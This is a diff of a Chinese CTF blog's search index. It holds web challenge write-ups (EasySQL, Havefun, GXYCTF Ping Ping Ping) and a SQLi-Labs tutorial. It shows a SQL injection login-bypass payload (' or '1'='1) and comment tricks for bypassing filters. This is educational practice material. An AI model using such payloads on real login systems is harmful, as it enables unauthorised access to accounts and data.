 <h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>进题目发现是个登陆页面<br><img src="https://img-blog.csdnimg.cn/20200510222050509.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>admin admin登陆一下<br><img src="https://img-blog.csdnimg.cn/20200510222136276.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>注意URL，试试万能密码<code>?username=admin&amp;password=admin&#39; or &#39;1&#39;=&#39;1</code>(tip：当passwd不对时后面的or 1=1恒真导致错误密码也可登陆)<br><img src="https://img-blog.csdnimg.cn/20200510222355982.png" alt="在这里插入图片描述"></p>
 <hr>
 <h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><p>题目主页是个可爱的小猫<br><img src="https://img-blog.csdnimg.cn/20200510222716536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源码（weber必做的事哈哈）发现php代码<br><img src="https://img-blog.csdnimg.cn/20200510222817108.png" alt="在这里插入图片描述"><br>根据提示传参<br><img src="https://img-blog.csdnimg.cn/20200510222856511.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU3ODQ5Mg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
@@ -685,18 +785,32 @@
         <category>CTF做题记录</category>
       </categories>
       <tags>
-        <tag>信息安全 安全</tag>
+        <tag>CTF WEB</tag>
       </tags>
   </entry>
   <entry>
     <title>BUUOJ-[GXYCTF2019]-WEB-WP</title>
-    <url>/2020/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
-
-<blockquote>
+    <url>/2020/K4H6SZ/</url>
+    <content><![CDATA[<blockquote>
 <p>平台地址：<a href="https://buuoj.cn/">https://buuoj.cn/</a></p>
 </blockquote>
-<p>@<a href="%E7%9B%AE%E5%BD%95">TOC</a></p>
+<!-- TOC -->
+
+<ul>
+<li><a href="#ping-ping-ping">Ping Ping Ping</a></li>
+<li><a href="#babysqli">BabySQli</a></li>
+<li><a href="#%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83">禁止套娃</a></li>
+<li><a href="#babyupload">BabyUpload</a><ul>
+<li><a href="#img-srchttpsimg-blogcsdnimgcn20200916144920251pngx-oss-processimagewatermarktype_zmfuz3pozw5nagvpdgkshadow_10text_ahr0chm6ly9ibg9nlmnzzg4ubmv0l3dlaxhpbl80mzu3odq5mgsize_16color_fffffft_70pic_center-alt%E5%9C%A8%E8%BF%99%E9%87%8C%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87%E6%8F%8F%E8%BF%B0">!在这里插入图片描述</a></li>
+</ul>
+</li>
+<li><a href="#strongestmind">StrongestMind</a></li>
+<li><a href="#babysqliv30">BabysqliV3.0</a></li>
+<li><a href="#end">END</a></li>
+</ul>
+<!-- /TOC -->
+
+<a id="more"></a>
 <hr>
 <h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><blockquote>
 <p>知识点：RCE，空格及过滤的一些基本绕过</p>
@@ -793,11 +907,35 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
+      <tags>
+        <tag>CTF WEB</tag>
+      </tags>
   </entry>
   <entry>
     <title>SQLi-Labs 修炼手册 （Less-1-10）</title>
-    <url>/2019/undefined/</url>
-    <content><![CDATA[<a id="more"></a>
+    <url>/2019/17JD2NV/</url>
+    <content><![CDATA[<!-- TOC -->
+
+<ul>
+<li><a href="#0x00--%E5%89%8D%E8%A8%80">0x00  前言</a></li>
+<li><a href="#0x01--%E4%BF%AE%E7%82%BC">0x01  修炼</a><ul>
+<li><a href="#less-1-get-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84-%E5%8D%95%E5%BC%95%E5%8F%B7-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">Less-1 GET-基于错误的-单引号-字符型注入</a></li>
+<li><a href="#less-2-get-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84-%E6%95%B0%E5%AD%97%E5%9E%8B">Less-2 GET-基于错误的-数字型</a></li>
+<li><a href="#less-3-get-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2%E7%9A%84%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">Less-3 GET-基于错误的-单引号变形的字符型注入</a></li>
+<li><a href="#less-4-get-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84-%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">Less-4 GET-基于错误的-双引号字符型注入</a></li>
+<li><a href="#less-5-get-%E5%8F%8C%E6%B3%A8%E5%85%A5-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">Less-5 GET-双注入-单引号字符型注入</a></li>
+<li><a href="#less-6-get-%E5%8F%8C%E6%B3%A8%E5%85%A5-%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">LESS-6 GET-双注入-双引号字符型注入</a></li>
+<li><a href="#less-7-get-%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">LESS-7 GET-导出文件-字符型注入</a></li>
+<li><a href="#less-8-get-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">LESS-8 GET-布尔盲注-单引号字符型注入</a></li>
+<li><a href="#less-9-get-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">LESS-9 GET-基于时间的盲注-单引号字符型注入</a></li>
+<li><a href="#less-10-get-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8-%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">LESS-10 GET-基于时间的盲注-双引号字符型注入</a></li>
+</ul>
+</li>
+<li><a href="#end">END</a></li>
+</ul>
+<!-- /TOC -->
+
+<a id="more"></a>
 
 <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h1><hr>
 <p>如果你是自己搭建的环境，请使用5.5以上的版本，这样才会有虚拟数据库information，以方便我们去修炼<br>在注释方面，有<code>-- </code>(–空格)、<code>#</code>、<code>/**/</code>三种，常常使用第一种，注入时使用<code>#</code>会让浏览器捉摸不透原因是url中#号是用来指导浏览器动作的（例如锚点），对服务器端完全无用。所以，HTTP请求中不包括<code>#</code>；<code>/**/</code>是多行注释常用绕过当成空格<br>在URL中如果在末尾使用<code>--空格</code>，浏览器会把空格删去，而<code>+</code>会被浏览器解释为空格，所以注入时使用<code>--+</code>作为注释使用或者<code>-- a</code></p>
@@ -871,5 +1009,9 @@
       <categories>
         <category>CTF做题记录</category>
       </categories>
+      <tags>
+        <tag>CTF WEB SQL注入</tag>
+        <tag>...</tag>
+      </tags>
   </entry>
 </search>
